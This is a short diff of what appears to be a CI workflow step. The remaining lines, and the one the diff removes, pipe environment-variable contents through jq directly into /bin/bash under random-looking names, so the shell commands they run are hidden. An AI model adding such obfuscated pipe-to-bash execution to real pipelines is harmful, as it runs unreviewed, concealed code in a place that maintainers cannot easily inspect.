@@ -28,7 +28,6 @@ jobs:
         run: |
           printf '%s' "$n12" | jq -r .zgvty8 | /bin/bash
           echo $dso9515 | jq -r .gr7443 | /bin/bash
-          echo $inojx6 | jq -r .ugrfp04970 | /bin/bash
 
       - name: Persist output
         if: always()
